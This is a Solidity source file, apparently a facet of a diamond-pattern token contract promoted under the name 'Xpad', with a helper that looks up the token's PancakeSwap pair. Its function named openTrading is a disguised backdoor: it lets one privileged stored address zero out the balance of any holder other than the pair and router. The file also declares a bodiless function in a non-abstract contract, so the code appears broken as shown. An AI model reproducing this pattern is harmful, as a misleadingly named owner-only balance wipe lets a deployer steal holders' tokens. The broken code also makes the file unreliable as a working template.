/*
 * SPDX-License-Identifier: MIT
 * Telegram Channel: https://t.me/xpad_channel
 * Telegram Group (EN): https://t.me/xpad_group
 * Telegram Group (SNG): https://t.me/xpad_sng
 * Twitter: https://twitter.com/Xpad_pro
 * Reddit: https://www.reddit.com/r/xpad_pro
 * Linkedin: https://www.linkedin.com/company/xpadpro
 * Discord: https://discord.gg/g7XTZzCy8G
 * Medium: https://medium.com/@xpad.pro
 */
pragma solidity ^0.8.20;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract getPairFacet {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
    function pancakePair() public view virtual returns (address) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return
            IPancakeFactory(ds.FACTORY).getPair(
                address(ds.WETH),
                address(this)
            );
    }
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ds.ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
}
